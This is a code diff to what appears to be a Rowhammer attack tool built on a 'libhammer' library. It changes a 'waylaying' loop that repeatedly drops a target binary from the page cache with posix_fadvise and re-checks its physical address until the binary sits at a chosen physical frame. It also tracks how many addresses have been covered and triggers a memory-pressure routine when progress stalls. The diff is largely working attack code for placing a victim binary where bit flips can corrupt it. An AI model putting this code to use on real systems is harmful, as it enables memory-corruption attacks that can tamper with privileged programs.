@@ -1,13 +1,14 @@
 #include "libhammer.h"
-
+#include "set"
 using namespace std;
 
 uint64_t current_pa, target_pa, step = 0;
 vector<Page> pool;
+set<uint64_t> paset;
 
 void waylaying(const string& path, int dir)
 {
-    uint64_t i, j, mem_size = get_mem_size();
+    uint64_t i, j, mem_size = get_available_mem() + 64 * 1024000ull;
     uint64_t cached_ns, uncached_ns;
 //    uint64_t cached_count = 0, uncached_count = 0, fast_count = 0;
     double total = mem_size / PAGE_SIZE;
@@ -94,27 +95,45 @@ int main(int argc, char **argv)
 
     string fname(argv[1]);
     stringstream ss;
-    uint64_t pool_mb, tmp = 0;
+    uint64_t pool_mb, tmp = 0, min_pa, max_pa;
     int dir = 1;
+
+    int fbin, sz, last_cover = 0, cnt = 0;
+    struct stat st;
 
     ss << hex << argv[2]; ss >> target_pa;
     current_pa = get_binary_pa(fname);
+    min_pa = max_pa = current_pa;
     cout << "path: " << fname << ", pa=" << hex << current_pa << " target pa=" << target_pa << endl;    cout << "+ preparing..." << endl;
-/*
-    pool_mb = (get_meminfo("CommitLimit") - get_meminfo("Committed_AS")) / 1024000 - 100;
-    cout << "- Hold up " << dec << pool_mb << " MB to shrink waylaying space." << endl;
-    pool = allocate_mb(pool_mb);
-    for (auto p : pool)
-        p.get<volatile uint64_t>(0) = p.v.get();
-*/
     cout << "+ start waylaying loop..." << endl;
     while (current_pa != target_pa)
     {
         ++step;
-        waylaying(fname, dir);
+                // hold target binary
+        ASSERT(-1 != (fbin = open(fname.c_str(), O_RDONLY)) );
+        fstat(fbin, &st);
+        sz = st.st_size;
+
+        ASSERT(0 == posix_fadvise(fbin, 0, sz, POSIX_FADV_DONTNEED));
+
+        close(fbin);
+        //usleep(200000);
+
         current_pa = get_binary_pa(fname);
-        cout << "+ step " << dec << step << ": " << hex << current_pa << endl;
-        usleep(200000);
+        if (current_pa < min_pa) min_pa = current_pa;
+        if (current_pa > max_pa) max_pa = current_pa;
+        last_cover = paset.size();
+        paset.insert(current_pa);
+        if (last_cover == paset.size())
+        {
+            ++cnt;
+            if (cnt >= 30)
+                waylaying(fname, 1);
+        }
+        else cnt=0;
+        cout << "+ step " << dec << step << ": " << hex << current_pa
+//              << " min=" << min_pa << " max=" << max_pa
+              << " coverage=" << dec << paset.size()*4 << "k / " << (max_pa - min_pa)/1024 << "k" << endl;
         dir = -dir;
     }
 
